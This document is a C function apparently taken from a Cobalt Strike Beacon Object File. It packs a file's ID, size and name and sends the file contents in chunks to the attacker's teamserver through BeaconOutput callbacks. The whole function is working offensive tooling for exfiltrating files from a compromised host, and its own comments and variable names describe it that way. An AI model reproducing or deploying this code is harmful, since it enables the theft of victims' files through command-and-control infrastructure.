
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    int chunkSize = 1024 * 900;

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileSize
    int messageLength = 8 + downloadFileNameLength;
    char* packedData = calloc(messageLength, sizeof(char));

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 0x18) & 0xFF;
    packedData[5] = (fileSize >> 0x10) & 0xFF;
    packedData[6] = (fileSize >> 0x08) & 0xFF;
    packedData[7] = (fileSize >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);
    free(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + chunkSize;
    char* packedChunk = calloc(chunkLength, sizeof(char));

    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileSize)
    {
        // send the file content by chunks
        chunkLength = fileSize - exfiltrated > chunkSize ? chunkSize : fileSize - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = returnData[i];
        }
        // send a chunk
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
        exfiltrated += chunkLength;
    }
    free(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
}
